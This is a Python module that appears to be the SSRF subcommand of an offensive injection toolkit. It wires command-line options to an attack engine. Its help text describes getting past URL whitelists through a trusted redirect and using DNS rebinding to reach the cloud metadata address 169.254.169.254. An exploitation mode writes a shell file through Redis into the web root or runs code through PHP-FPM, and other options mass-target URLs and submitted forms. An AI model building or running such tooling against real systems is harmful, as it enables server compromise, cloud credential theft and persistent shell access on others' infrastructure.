"""SSRF: prove the fetch, map what it can reach, pick the follow-up.

    python injectorkit.py ssrf -u "http://target/fetch?url=http://example.com"
    python injectorkit.py ssrf -u "http://target/fetch?url=x" --param url --oob 10.0.0.5:8081

Without a listener the blind paths are skipped rather than sent, because a
callback that can never arrive is not a test.
"""

from __future__ import annotations

import argparse

from ...core.httpmsg import Request
from ...core.params import Param
from ...core.protocols import rebind_host
from ...engine.blackboard import Blackboard
from ...engine.bypass import Bypass
from ...engine.evidence import Judge
from ...engine.runner import collect_targets, resume_session, select_params
from ...engine.statemachine import Engine, RunContext
from . import mutators as _mutators  # noqa: F401  (registers this module's mutators)
from .graph import build_graph
from .seeds import LIKELY_PARAMS

NAME = "ssrf"
HELP = "server-side request forgery: prove a fetch, fingerprint internal services, choose the next step"


def add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--url", help="target URL, including the parameter to attack")
    parser.add_argument("-r", "--request", help="a raw HTTP request captured from a proxy")
    parser.add_argument("--param", help="parameter to inject into (default: pick the likely ones)")
    parser.add_argument("--max-params", type=int, default=6, help="how many parameters to try")
    parser.add_argument(
        "--via",
        action="append",
        metavar="URL",
        help="route every payload through a host the target trusts, with {target} standing for the "
        "real destination, e.g. 'http://allowed/redirect?to={target}'. A whitelisting filter cannot be "
        "walked past by spelling anything differently - this is the way past it",
    )

    exploit = parser.add_argument_group("exploitation")
    exploit.add_argument(
        "--exploit",
        action="store_true",
        help="act on fingerprinted services: write a file through Redis, or run code through PHP-FPM",
    )
    exploit.add_argument("--webroot", metavar="DIR", help="a web-accessible directory on the target, for the Redis chain")
    exploit.add_argument("--shell-name", metavar="FILE", help="filename to write the shell as")
    exploit.add_argument("--fpm-script", metavar="PATH", help="a PHP file that exists on the target, for the PHP-FPM chain")
    exploit.add_argument("--fpm-port", type=int, default=9000, help="PHP-FPM port (default: 9000)")

    parser.add_argument(
        "--forms",
        action="store_true",
        help="fetch the page and submit every form it declares, so parameters that live in a form "
        "body - not in the URL - are tested too",
    )
    parser.add_argument(
        "--batch",
        metavar="FILE",
        help="test many targets from one file: a URL, or a path to a saved raw request, per line",
    )
    parser.add_argument(
        "--rebind",
        metavar="INTERNAL,EXTERNAL",
        help="try each destination again under a DNS name that alternates between an internal "
        "address and an external one, e.g. '169.254.169.254,192.168.44.1'. This is what gets past "
        "a check that resolves the name once and connects later",
    )


def _rebind_name(value: str | None) -> str:
    """Turn `--rebind INTERNAL,EXTERNAL` into a name that alternates between them."""
    if not value:
        return ""
    parts = [piece.strip() for piece in value.split(",")]
    if len(parts) != 2 or not all(parts):
        raise SystemExit("--rebind expects INTERNAL,EXTERNAL, for example 169.254.169.254,192.168.44.1")
    return rebind_host(parts[0], parts[1])


def run(args: argparse.Namespace, runtime) -> int:
    targets = collect_targets(args, runtime, NAME)
    if len(targets) > 1:
        runtime.info(f"targets: {len(targets)}")

    tested = 0
    for index, request in enumerate(targets, 1):
        params = select_params(request, args.param, args.max_params, LIKELY_PARAMS)
        if not params:
            runtime.info(f"  [{index}/{len(targets)}] no injectable parameter; skipped")
            continue
        if len(targets) > 1:
            runtime.info("")
            runtime.info(f"=== [{index}/{len(targets)}] {request.describe()} ===")
        run_one(request, params, args, runtime)
        tested += 1

    if tested == 0:
        raise SystemExit(
            "no injectable parameter found; name one with --param (parameter keys are "
            "query:<name>, body:<name>, cookie:<name>, json -> <field>, multipart:<name>)"
        )
    return 0


def run_one(request: Request, params: list[Param], args: argparse.Namespace, runtime) -> None:
    blackboard = Blackboard(target=request.host())
    if args.session:
        resumed = resume_session(args.session, blackboard.target)
        if resumed is not None:
            blackboard = resumed
            runtime.info(
                f"  session: {len(blackboard.facts)} facts and {len(blackboard.dead_ends)} closed "
                f"paths carried over from {args.session}"
            )
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=blackboard,
        judge=Judge(),
        bypass=Bypass(blackboard, enabled=not args.no_bypass),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "exploit": args.exploit,
            "webroot": args.webroot,
            "shell_name": args.shell_name,
            "fpm_script": args.fpm_script,
            "fpm_port": args.fpm_port,
            "rebind": _rebind_name(args.rebind),
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    Engine(context.graph, context).run()
    runtime.emit("")
    runtime.emit(blackboard.render())
    if args.session:
        blackboard.save(args.session)
